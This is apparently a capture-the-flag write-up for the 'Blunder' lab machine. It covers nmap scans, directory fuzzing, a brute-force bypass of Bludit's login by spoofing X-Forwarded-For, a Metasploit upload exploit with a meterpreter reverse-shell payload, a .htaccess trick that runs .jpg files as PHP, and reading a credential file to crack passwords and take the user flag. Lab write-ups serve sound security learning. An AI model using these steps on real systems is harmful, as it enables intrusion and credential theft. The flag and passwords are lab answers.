# Blunder

Machine IP:  10.10.10.191

## Enumeration and recon
 
#### Scan 1 (Quick scan):

```s
nmap 10.10.10.191
```

Response:

```s
Not shown: 998 filtered ports
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http
```

#### Scan 2 (most common port scan):

```s
nmap -F 10.10.10.191
```
Response:

```s
Not shown: 98 filtered ports
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http
```

#### Scan 3 (OS and services detection)

```s
nmap -A 10.10.10.191
```

Response:

```s
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
```

Seems like a web server is lurking is http://10.10.10.191:80. [`http-generator`](https://nmap.org/nsedoc/scripts/http-generator.html) displays the contents of the generator meta-tag of a webpage.

#### Scan 4 (TCP connect)

```s
nmap -sT 10.10.10.191
```

Response:

```s
Not shown: 998 filtered ports
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http
```

#### Scan 5 (UDP)

```s
nmap -sU 10.10.10.191
```

Response:

```s
Not shown: 998 open|filtered ports
PORT   STATE  SERVICE
21/udp closed ftp
80/udp closed http
```

#### Scan 5 (Service detection)

```s
nmap -sV 10.10.10.191
```

Response

```s
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
```

# Metasploit version

1. dirsearch (found `admin`)

2. wfuzz (found `todo.txt` with user `fergus`)

3. cewl to create a custom wordlist for `fergus`.

4. brute force password: `RolandDeschain`

5. `use exploit/linux/http/bludit_upload_images_exec`

6. `set payload php/meterpreter/reverse_tcp`

7. `python -c 'import pty;pty.spawn("/bin/bash")'` to spawn a shell.

8. 


# Full version


## Finding directories

Directory wordlist: `/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

Result:

```s
http://10.10.10.191:80/0
http://10.10.10.191:80/admin
http://10.10.10.191:80/usb
http://10.10.10.191:80/LICENSE
http://10.10.10.191:80/about
```

`admin` page reveals the server uses Bludit.

## Hidden txt files

[Files wordlist](https://github.com/xmendez/wfuzz/blob/master/wordlist/general/medium.txt)

Result:

```s
http://10.10.10.191:80/todo.txt
```

`todo.txt` has the following info:

```s
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

`fergus` is a user. On to cracking the password.

## Custom password wordlist

`cewl -d 5 -o -e -w custom_wordlist.txt http://10.10.10.191/`


## Bludit anti brute force attack evasion 

[Source](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)

The following stuff for preventing brute force attacks:

```php
public function getUserIp()
{
  if (getenv('HTTP_X_FORWARDED_FOR')) {
    $ip = getenv('HTTP_X_FORWARDED_FOR');
  } elseif (getenv('HTTP_CLIENT_IP')) {
    $ip = getenv('HTTP_CLIENT_IP');
  } else {
    $ip = getenv('REMOTE_ADDR');
  }
  return $ip;
}
```

IP addresses are blocked based on `X_FORWARDED_FOR` header. And no check is done for the same. User input is trusted for the ip.

Source to hack: `http://10.10.10.191:80/admin/login`

```python
python3 brute_force_password.py custom_wordlist.txt
```

Few pointers:

1. After some trial and error, found that `http://10.10.10.191:80/admin/login` issues a new token everytime the page is refreshed.

2. Because of 1, we need a new session everytime to try a new password. A new session generates a new token.

3. Redirections (status 301) occured on every request. On incorrect passwords, redirection to same `http://10.10.10.191:80/admin/login` occurred.

## Stage I exploit

[Refer vulnerability](https://github.com/bludit/bludit/issues/1081)

[View Page Source](view-source:http://10.10.10.191/admin/new-content)

```php
var HTML_PATH_ROOT = "/";
var HTML_PATH_ADMIN_ROOT = "/admin/";
var HTML_PATH_ADMIN_THEME = "/bl-kernel/admin/themes/booty/";
var HTML_PATH_CORE_IMG = "/bl-kernel/img/";
var HTML_PATH_UPLOADS = "/bl-content/uploads/";
var HTML_PATH_UPLOADS_THUMBNAILS = "/bl-content/uploads/thumbnails/";
var BLUDIT_VERSION = "3.9.2";
var BLUDIT_BUILD = "20190530";
var DOMAIN = "http://10.10.10.191";
var DOMAIN_BASE = "http://10.10.10.191/";
var DOMAIN_CONTENT = "http://10.10.10.191/bl-content/";
var DOMAIN_UPLOADS = "http://10.10.10.191/bl-content/uploads/";
var DB_DATE_FORMAT = "Y-m-d H:i:s";
var AUTOSAVE_INTERVAL = "2";
var PAGE_BREAK = "<!-- pagebreak -->";
var tokenCSRF = "c42a453f13f005e2da8c4e5546b8ca83d947920f";
var UPLOAD_MAX_FILESIZE = 2097152;
```

After logging in with `{fergus: RolandDeschain}`, we are given this set of variables. 

Another piece of interesting code:

```php
<form name="bluditFormUpload" id="jsbluditFormUpload" enctype="multipart/form-data">
			<div class="custom-file">
				<input type="file" class="custom-file-input" id="jsimages" name="images[]" multiple>
				<label class="custom-file-label" for="jsimages">Choose images to upload</label>
			</div>
		</form>
```

Allows upload of an image by the name `images[]`. The next piece is the main function responsible for uploading images.

```php
function uploadImages() {
	// Remove current alerts
	hideMediaAlert();

	var images = $("#jsimages")[0].files;
	for (var i=0; i < images.length; i++) {
		// Check file type/extension
		const validImageTypes = ['image/gif', 'image/jpeg', 'image/png', 'image/svg+xml'];
		if (!validImageTypes.includes(images[i].type)) {
			showMediaAlert("File type is not supported. Allowed types: gif, png, jpg, jpeg, svg");
			return false;
		}

		// Check file size and compare with PHP upload_max_filesize
		if (images[i].size > UPLOAD_MAX_FILESIZE) {
			showMediaAlert("Maximum load file size allowed: 2M");
			return false;
		}
	};

	// Clean progress bar
	$("#jsbluditProgressBar").removeClass().addClass("progress-bar bg-primary");
	$("#jsbluditProgressBar").width("0");

	// Data to send via AJAX
	var formData = new FormData($("#jsbluditFormUpload")[0]);
	formData.append("uuid", "d39be04b8fed489d1927f1264f5ec7bf");
	formData.append("tokenCSRF", tokenCSRF);

	$.ajax({
		url: HTML_PATH_ADMIN_ROOT+"ajax/upload-images",
		type: "POST",
		data: formData,
		cache: false,
		contentType: false,
		processData: false,
		xhr: function() {
			var xhr = $.ajaxSettings.xhr();
			if (xhr.upload) {
				xhr.upload.addEventListener("progress", function(e) {
					if (e.lengthComputable) {
						var percentComplete = (e.loaded / e.total)*100;
						$("#jsbluditProgressBar").width(percentComplete+"%");
					}
				}, false);
			}
			return xhr;
		}
	}).done(function(data) {
		if (data.status==0) {
			$("#jsbluditProgressBar").removeClass("bg-primary").addClass("bg-success");
			// Get the files for the first page, this include the files uploaded
			getFiles(1);
		} else {
			$("#jsbluditProgressBar").removeClass("bg-primary").addClass("bg-danger");
			showMediaAlert(data.message);
		}
	});
}
```

Things to look at:

1. There's a filter to the extension of uploaded files. We must thus upload only image files.

2. `POST` ajax data involves both the `uuid` and `tokenCSRF`.

3. A quick search gave the role of uuid in uploading images using ajax: [new](https://medium.com/@rustyonrampage/uploading-images-to-node-express-using-ajax-straightforward-way-7a9d12a48d48) and [old](https://github.com/balderdashy/sails/issues/27). In brief, the following happens:

`newFileName= uuid + "." + _.str.fileExtension(file.name),`

This is where the uuid abuse comes in. The server allows `uuid` and `CSRF` token to be submitted in a form:

```html
<input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="c42a453f13f005e2da8c4e5546b8ca83d947920f">

<input type="hidden" id="jsparent" name="parent" value="">

<input type="hidden" id="jsuuid" name="uuid" value="d39be04b8fed489d1927f1264f5ec7bf">

<input type="hidden" id="jstype" name="type" value="published">

<input type="hidden" id="jscoverImage" name="coverImage" value="">

<input type="hidden" id="jscontent" name="content" value="">
```

Now comes the `.htaccess` stuff.

```s
RewriteEngine off
AddType application/x-httpd-php .jpg
```

The first line is simply turning rewriting off in a particular subdirectory. The second one allows running a php file with a jpg extension [source](https://stackoverflow.com/questions/8025236/is-it-possible-to-execute-php-with-extension-file-php-jpg).


Moreover, landing on the login page before login gives a different token (ex. `b60296a3db218d9a8c25c4f4289c35543282137a`) than after loggin in (ex. `5255f84b2a129ee7a02b23664c520a18b00e7b58`).

Reverse shell opened.

## Stage II exploit (Postexploitation)

### User flag

```s
cat /var/www/bludit-3.9.2/bl-content/databases/users.php
```

Response:

```s
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
```

Password `bfcc887f62e36ea019e3295aafb8a3885966e265` and salt `5dde2887e7aca`. Crack this on `https://cmd5.com/` to get password as `Password120`.

`home` has two users: `hugo` and `shaun`. We go into `hugo` to find `users.txt`.

```s
echo Password120 | su hugo -c \"ls ../../../../../home/hugo\"
```

Response:

```s
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
user.txt
Videos
```

Opening this file:

```s
echo Password120 | su hugo -c \"cat ../../../../../home/hugo/user.txt\"
```
User flag: `1b6ab8eb1ca4daf8eea3f9dfeb70fa7d`

### Root flag

[This](https://www.exploit-db.com/exploits/47502) is the vulnerability being used here. I can't find a work around with my simple stuff.